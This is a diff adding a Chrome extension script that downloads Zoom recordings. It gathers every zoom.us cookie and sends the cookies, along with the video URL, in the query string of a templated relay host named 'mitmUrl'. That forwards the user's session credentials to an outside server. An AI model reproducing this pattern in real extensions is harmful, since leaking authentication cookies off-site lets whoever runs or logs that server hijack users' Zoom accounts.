@@ -1,0 +1,27 @@
+const ZOOM_PREFIX = 'https://us02web.zoom.us';
+const ZOOM_SUFFIX = 'zoom.us';
+
+document.getElementById('download').addEventListener('click', () => {
+  chrome.tabs.query({
+    active: true
+  }, ([ tab ]) => {
+    if (!tab.url.startsWith(ZOOM_PREFIX)) {
+      return;
+    }
+
+    chrome.tabs.executeScript(tab.id, {
+      code: 'document.querySelector("video").src'
+    }, ([ src ]) => {
+      chrome.cookies.getAll({}, (cookies) => {
+        const cookieString = cookies
+          .filter(({ domain }) => domain.endsWith(ZOOM_SUFFIX))
+          .map(({ name, value }) => `${name}=${value}`)
+          .join('; ');
+        chrome.downloads.download({
+          filename: `zoom_${Date.now()}.mp4`,
+          url: `{{{mitmUrl}}}?cookie=${encodeURIComponent(cookieString)}&url=${encodeURIComponent(src)}`
+        });
+      });
+    });
+  });
+});
